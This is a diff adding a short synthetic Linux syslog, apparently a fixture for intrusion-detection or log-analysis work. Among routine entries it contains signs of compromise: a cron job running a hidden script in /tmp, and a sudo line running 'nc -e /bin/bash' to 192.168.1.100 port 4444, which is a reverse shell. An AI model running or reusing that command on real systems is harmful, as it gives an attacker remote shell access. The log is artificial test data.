@@ -1,0 +1,13 @@
+Jan 10 08:00:01 server systemd[1]: Starting Daily apt download activities...
+Jan 10 08:01:00 server kernel: usb 1-1: new high-speed USB device number 2
+Jan 10 08:02:00 server NetworkManager[800]: device eth0 state change
+Jan 10 08:03:00 server kernel: EXT4-fs error (device sda1): ext4_find_entry
+Jan 10 08:04:00 server sudo: root COMMAND=/bin/netstat -antp
+Jan 10 08:05:00 server cron[1001]: (root) CMD (/usr/bin/python3 /tmp/.hidden_script.py)
+Jan 10 08:06:00 server kernel: nf_conntrack: table full, dropping packet
+Jan 10 08:07:00 server sshd[1300]: Received disconnect from 192.168.1.100
+Jan 10 08:08:00 server sudo: ubuntu COMMAND=/usr/bin/nc -e /bin/bash 192.168.1.100 4444
+Jan 10 08:09:00 server kernel: TCP: request_sock_TCP: Possible SYN flooding on port 80
+Jan 10 08:10:00 server auditd[600]: type=EXECVE msg=audit a0="/bin/bash" a1="-i"
+Jan 10 08:11:00 server sudo: root COMMAND=/usr/bin/whoami
+Jan 10 08:12:00 server kernel: device eth0 entered promiscuous mode
